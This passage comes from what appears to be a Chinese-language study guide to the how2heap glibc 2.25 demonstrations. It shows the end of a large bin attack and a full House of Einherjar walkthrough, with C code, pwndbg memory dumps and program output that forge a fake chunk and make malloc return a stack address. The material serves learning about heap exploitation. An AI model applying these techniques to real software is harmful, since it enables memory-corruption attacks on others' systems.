0x6037e0:	0x0000000000000000	0x0000000000000000
pwndbg> p/x stack_var1
$11 = 0x6037a0
pwndbg> p/x stack_var2
$12 = 0x6037a0
```

### 输出

```
$ ./glibc_2.25/large_bin_attack
This file demonstrates large bin attack by writing a large unsigned long value into stack
In practice, large bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack

Let's first look at the targets we want to rewrite on stack:
stack_var1 (0x7fffffffdcc0): 0
stack_var2 (0x7fffffffdcc8): 0

Now, we allocate the first large chunk on the heap at: 0x603000
And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the first large chunk during the free()

Then, we allocate the second large chunk on the heap at: 0x603360
And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the second large chunk during the free()

Finally, we allocate the third large chunk on the heap at: 0x6037a0
And allocate another fastbin chunk in order to avoid consolidating the top chunk with the third large chunk during the free()

We free the first and second large chunks now and they will be inserted in the unsorted bin: [ 0x603360 <--> 0x603000 ]

Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation, and reinsert the remaining of the freed first large chunk into the unsorted bin: [ 0x6030a0 ]

Now, we free the third large chunk and it will be inserted in the unsorted bin: [ 0x6037a0 <--> 0x6030a0 ]

Now emulating a vulnerability that can overwrite the freed second large chunk's "size" as well as its "bk" and "bk_nextsize" pointers
Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk at the head of the large bin freelist. To overwrite the stack variables, we set "bk" to 16 bytes before stack_var1 and "bk_nextsize" to 32 bytes before stack_var2

Let's malloc again, so the freed third large chunk being inserted into the large bin freelist. During this time, targets should have already been rewritten:
stack_var1 (0x7fffffffdcc0): 0x6037a0
stack_var2 (0x7fffffffdcc8): 0x6037a0
```

## house_of_einherjar

Exploiting a single null byte overflow to trick malloc into returning a controlled pointer

> house of einherjar 是一种堆利用技术，由 Hiroki Matsukuma 提出。该堆利用技术可以强制使得 malloc 返回一个几乎任意地址的 chunk 。
> 它要求有一个单字节溢出漏洞，覆盖掉 next chunk 的 size 字段并清除 PREV_IN_USE 标志，然后还需要覆盖 prev_size 字段为 fake chunk 的大小。

### 解释

首先我们申请一个 chunk

``` c++
	fprintf(stderr, "\nWe allocate 0x38 bytes for 'a'\n");
	a = (uint8_t*) malloc(0x38);
	fprintf(stderr, "a: %p\n", a);
    
    int real_a_size = malloc_usable_size(a);
    fprintf(stderr, "Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: %#x\n", real_a_size);
```

为了覆盖 a，我们还需要知道对齐之后 a 的真实大小。

接下来构造一块 fake chunk：

``` c++
    // create a fake chunk
    fprintf(stderr, "\nWe create a fake chunk wherever we want, in this case we'll create the chunk on the stack\n");
    fprintf(stderr, "However, you can also create the chunk in the heap or the bss, as long as you know its address\n");
    fprintf(stderr, "We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n");
    fprintf(stderr, "(although we could do the unsafe unlink technique here in some scenarios)\n");

    size_t fake_chunk[6];

    fake_chunk[0] = 0x100; // prev_size is now used and must equal fake_chunk's size to pass P->bk->size == P->prev_size
    fake_chunk[1] = 0x100; // size of the chunk just needs to be small enough to stay in the small bin
    fake_chunk[2] = (size_t) fake_chunk; // fwd
    fake_chunk[3] = (size_t) fake_chunk; // bck
    fake_chunk[4] = (size_t) fake_chunk; //fwd_nextsize
    fake_chunk[5] = (size_t) fake_chunk; //bck_nextsize
    
    
    fprintf(stderr, "Our fake chunk at %p looks like:\n", fake_chunk);
    fprintf(stderr, "prev_size (not used): %#lx\n", fake_chunk[0]);
    fprintf(stderr, "size: %#lx\n", fake_chunk[1]);
    fprintf(stderr, "fwd: %#lx\n", fake_chunk[2]);
    fprintf(stderr, "bck: %#lx\n", fake_chunk[3]);
    fprintf(stderr, "fwd_nextsize: %#lx\n", fake_chunk[4]);
    fprintf(stderr, "bck_nextsize: %#lx\n", fake_chunk[5]);
```

我们可以在任意地方创建 fake chunk，在这里我们在栈上创建。只要你知道它的地址，你也可以在堆上或 bss 段上创建 fake chunk。

虽然某些情况下我们也可以执行 unsafe unlink，但是这里我们让 fwd 和 bck 指针都指向 fake chunk 以通过 unlink 的检查。

输出如下：

```
Our fake chunk at 0x7fffffffdc50 looks like:
prev_size (not used): 0x100
size: 0x100
fwd: 0x7fffffffdc50
bck: 0x7fffffffdc50
fwd_nextsize: 0x7fffffffdc50
bck_nextsize: 0x7fffffffdc50
```

查看内存：

```
pwndbg> p/x fake_chunk 
$1 = {0x100, 0x100, 0x7fffffffdc50, 0x7fffffffdc50, 0x7fffffffdc50, 0x7fffffffdc50}
```

也和我们的预期值相符。

在未来 free 掉 next chunk 时，让合并的堆块到 fake chunk 处，下一次 malloc 将返回我们想要的地址。

接下来 malloc 一个 chunk。

``` c++
	/* In this case it is easier if the chunk size attribute has a least significant byte with
	 * a value of 0x00. The least significant byte of this will be 0x00, because the size of 
	 * the chunk includes the amount requested plus some amount required for the metadata. */
	b = (uint8_t*) malloc(0xf8);
```

接下来我们假设有一个堆溢出漏洞，它会修改 chunk b 的 prev_inuse 位，这样 malloc 会认为 b 之前的 chunk 是空闲的。

``` c++
	uint64_t* b_size_ptr = (uint64_t*)(b - 8);
    /* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/

	fprintf(stderr, "\nb.size: %#lx\n", *b_size_ptr);
	fprintf(stderr, "b.size is: (0x100) | prev_inuse = 0x101\n");
	fprintf(stderr, "We overflow 'a' with a single null byte into the metadata of 'b'\n");
	a[real_a_size] = 0; 
	fprintf(stderr, "b.size: %#lx\n", *b_size_ptr);
    fprintf(stderr, "This is easiest if b.size is a multiple of 0x100 so you "
           "don't change the size of b, only its prev_inuse bit\n");
    fprintf(stderr, "If it had been modified, we would need a fake chunk inside "
           "b where it will try to consolidate the next chunk\n");
```

由于 b 的 size 是 0x100 的整数倍，因此不需要更改 b 的大小，只需要更改它的 prev_inuse 位。如果 b 的大小被修改，那我们需要在 b 的内部放一个 fake chunk 才能合并这个 chunk。

修改前：

```
pwndbg> p b
$2 = (uint8_t *) 0x603050 ""
pwndbg> x/20xg b-16
0x603040:	0x0000000000000000	0x0000000000000101      <-- b size
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x0000000000000000
0x603080:	0x0000000000000000	0x0000000000000000
0x603090:	0x0000000000000000	0x0000000000000000
0x6030a0:	0x0000000000000000	0x0000000000000000
0x6030b0:	0x0000000000000000	0x0000000000000000
0x6030c0:	0x0000000000000000	0x0000000000000000
0x6030d0:	0x0000000000000000	0x0000000000000000
pwndbg> heap
0x603040 PREV_INUSE {
  prev_size = 0, 
  size = 257, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
```

修改后：

```
pwndbg> x/20xg b-16
0x603040:	0x0000000000000000	0x0000000000000100      <-- b size overwritten
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x0000000000000000
0x603080:	0x0000000000000000	0x0000000000000000
0x603090:	0x0000000000000000	0x0000000000000000
0x6030a0:	0x0000000000000000	0x0000000000000000
0x6030b0:	0x0000000000000000	0x0000000000000000
0x6030c0:	0x0000000000000000	0x0000000000000000
0x6030d0:	0x0000000000000000	0x0000000000000000
0x603040 {
  prev_size = 0, 
  size = 256,   # size: 257 -> 256 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
```

接下来在 a 的最后 8 位写一个 fake prev_size 让它指向我们的 fake chunk。

``` c++
    // Write a fake prev_size to the end of a
    fprintf(stderr, "\nWe write a fake prev_size to the last %lu bytes of a so that "
           "it will consolidate with our fake chunk\n", sizeof(size_t));
    size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);
    fprintf(stderr, "Our fake prev_size will be %p - %p = %#lx\n", b-sizeof(size_t)*2, fake_chunk, fake_size);
    *(size_t*)&a[real_a_size-sizeof(size_t)] = fake_size;
```

输出：

```
Our fake prev_size will be 0x603040 - 0x7fffffffdc50 = 0xffff8000006053f0
                           chunk b      fake chunk
```

修改之后：

```
0x603040 {
  prev_size = 18446603336227509232, 
  size = 256, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
pwndbg> p b
$7 = (uint8_t *) 0x603050 ""
pwndbg> x/20xg b-32
0x603030:	0x0000000000000000	0x0000000000000000
0x603040:	0xffff8000006053f0	0x0000000000000100
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x0000000000000000
0x603080:	0x0000000000000000	0x0000000000000000
0x603090:	0x0000000000000000	0x0000000000000000
0x6030a0:	0x0000000000000000	0x0000000000000000
0x6030b0:	0x0000000000000000	0x0000000000000000
0x6030c0:	0x0000000000000000	0x0000000000000000
```

接下来修改 fake chunk 的 size 为 chunk b 的新 prev_size。

``` c++
    //Change the fake chunk's size to reflect b's new prev_size
    fprintf(stderr, "\nModify fake chunk's size to reflect b's new prev_size\n");
    fake_chunk[1] = fake_size;
```

```
pwndbg> p/x fake_chunk 
$8 = {0x100, 0xffff8000006053f0, 0x7fffffffdc50, 0x7fffffffdc50, 0x7fffffffdc50, 0x7fffffffdc50}
```

接下来 free 掉 chunk b。

``` c++
    // free b and it will consolidate with our fake chunk
    fprintf(stderr, "Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n");
    free(b);
    fprintf(stderr, "Our fake chunk size is now %#lx (b.size + fake_prev_size)\n", fake_chunk[1]);
```

这样 b 会和 fake chunk 结合，此时的 top chunk 被修改为了 fake chunk。由于我们释放了 chunk b，此时 PREV_INUSE 为 0，unlink 会根据 prev_size 寻找上一个 free chunk，并将它与当前 chunk 合并。

练习中的注释如下：

``` c++
    //if we allocate another chunk before we free b we will need to 
    //do two things: 
    //1) We will need to adjust the size of our fake chunk so that
    //fake_chunk + fake_chunk's size points to an area we control
    //2) we will need to write the size of our fake chunk
    //at the location we control. 
    //After doing these two things, when unlink gets called, our fake chunk will
    //pass the size(P) == prev_size(next_chunk(P)) test. 
    //otherwise we need to make sure that our fake chunk is up against the
    //wilderness
```

如果在 free b 之前申请另一个 chunk 会做两件事：

1. 我们需要调整 fake chunk 的 size 以便于 fake_chunk + fake_chunk 的 size 指向一块我们控制的区域
2. 我们需要向我们控制的地址写 fake chunk 的 size。

在做完这两件事之后，unlink 时我们的 fake chunk 就会通过 `size(P) == prev_size(next_chunk(P))` 的校验。

我们还要保证 fake chunk 与 wilderness?(这个咋翻译) 相对。

``` c++
    fprintf(stderr, "\nNow we can call malloc() and it will begin in our fake chunk\n");
    d = malloc(0x200);
    fprintf(stderr, "Next malloc(0x200) is at %p\n", d);
```

这时我们再 malloc 的话，它就会从 fake chunk 开始分配了。

```
Next malloc(0x200) is at 0x7fffffffdc60
```

### 输出

```
$ ./glibc_2.25/house_of_einherjar
Welcome to House of Einherjar!
Tested in Ubuntu 16.04 64bit.
This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.

We allocate 0x38 bytes for 'a'
a: 0x603010
Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: 0x38

We create a fake chunk wherever we want, in this case we'll create the chunk on the stack
However, you can also create the chunk in the heap or the bss, as long as you know its address
We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks
(although we could do the unsafe unlink technique here in some scenarios)
Our fake chunk at 0x7fffffffdca0 looks like:
prev_size (not used): 0x100
size: 0x100
fwd: 0x7fffffffdca0
bck: 0x7fffffffdca0
fwd_nextsize: 0x7fffffffdca0
bck_nextsize: 0x7fffffffdca0

We allocate 0xf8 bytes for 'b'.
b: 0x603050

b.size: 0x101
b.size is: (0x100) | prev_inuse = 0x101
We overflow 'a' with a single null byte into the metadata of 'b'
b.size: 0x100
This is easiest if b.size is a multiple of 0x100 so you don't change the size of b, only its prev_inuse bit
If it had been modified, we would need a fake chunk inside b where it will try to consolidate the next chunk

We write a fake prev_size to the last 8 bytes of a so that it will consolidate with our fake chunk
Our fake prev_size will be 0x603040 - 0x7fffffffdca0 = 0xffff8000006053a0

Modify fake chunk's size to reflect b's new prev_size
Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set
Our fake chunk size is now 0xffff800000626361 (b.size + fake_prev_size)

Now we can call malloc() and it will begin in our fake chunk
Next malloc(0x200) is at 0x7fffffffdcb0
```

# 参考文章

[通过 how2heap 复习堆利用 (一）](https://xz.aliyun.com/t/2582)

[【技术分享】how2heap总结-下](https://www.anquanke.com/post/id/86809)

[3.1.9 Linux 堆利用（四）](https://firmianay.gitbooks.io/ctf-all-in-one/doc/3.1.9_heap_exploit_4.html)

[glibc内存管理ptmalloc源代码分析.pdf](https://paper.seebug.org/papers/Archive/refs/heap/glibc%e5%86%85%e5%ad%98%e7%ae%a1%e7%90%86ptmalloc%e6%ba%90%e4%bb%a3%e7%a0%81%e5%88%86%e6%9e%90.pdf)